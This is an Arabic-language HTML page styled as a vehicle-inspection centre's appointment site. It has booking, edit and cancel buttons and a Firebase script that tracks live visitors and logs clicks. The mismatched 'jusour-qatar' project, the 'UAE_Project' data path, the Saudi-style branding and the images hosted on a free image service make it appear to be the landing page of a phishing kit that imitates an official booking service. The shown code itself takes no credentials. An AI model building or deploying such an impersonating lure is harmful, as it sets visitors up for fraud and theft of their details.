<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مركز سلامة المركبات</title>
    
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>

    <style>
        * { box-sizing: border-box; }
        body { 
            margin: 0; 
            padding: 0; 
            background-color: #f7f9fc; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
        }
        
        img { 
            width: 100%; 
            max-width: 500px; 
            height: auto; 
            display: block; 
        }

        .buttons-container { 
            width: 100%; 
            max-width: 500px; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            gap: 10px; 
            padding: 15px 0;
            background-color: #f7f9fc;
        }
        
        .btn { 
            width: 60%; 
            padding: 10px; 
            border-radius: 30px; 
            text-align: center; 
            font-weight: bold; 
            text-decoration: none; 
            font-size: 16px; 
            cursor: pointer;
            transition: 0.3s;
            display: block;
        }

        .btn-booking { background-color: #1a6d44; color: white; border: none; }
        .btn-edit { background-color: transparent; color: #333; border: 1.5px solid #333; }
        .btn-cancel { background-color: transparent; color: #e63946; border: 1.5px solid #e63946; }

    </style>
</head>
<body>

    <img src="https://i.ibb.co/RpnFNLHW/Whats-App-Image-2024-09-05-at-8-51-55-AM.jpg" alt="Final SASO Footer">

    <img src="https://i.ibb.co/sr0qLYB/IMG-20260318-WA0000.jpg" alt="Car Inspection Banner">

    <div class="buttons-container">
        <a onclick="logAction('booking', 'step1.php')" class="btn btn-booking">حجز موعد</a>
        <a onclick="logAction('edit', 'edit_appointment.php')" class="btn btn-edit">تعديل موعد</a>
        <a onclick="logAction('cancel', 'cancel_appointment.php')" class="btn btn-cancel">إلغاء موعد</a>
    </div>

    <img src="https://i.ibb.co/BKVb3D2p/IMG-20260318-WA0001.jpg" alt="App Stores Banner">

    <img src="https://i.ibb.co/b5LVtGWC/IMG-20260318-WA0002.jpg" alt="IMG 20260318 WA0002">

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyBRoLQJTQVVGIy9JmtaEFwAA", 
            authDomain: "jusour-qatar.firebaseapp.com",
            databaseURL: "https://jusour-qatar-default-rtdb.firebaseio.com",
            projectId: "jusour-qatar",
            storageBucket: "jusour-qatar.firebasestorage.app",
            messagingSenderId: "927435762624",
            appId: "1:927435762624:web:11d0bf460b62e4af9db625"
        };

        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        const visitorRef = database.ref('UAE_Project/live_visitors').push();
        visitorRef.set({ status: 'online', time: new Date().toLocaleString() });
        visitorRef.onDisconnect().remove();

        function logAction(type, target) {
            database.ref('UAE_Project/actions').push({
                button: type,
                time: new Date().toLocaleString()
            }).then(() => {
                window.location.href = target;
            });
        }
    </script>
</body>
</html>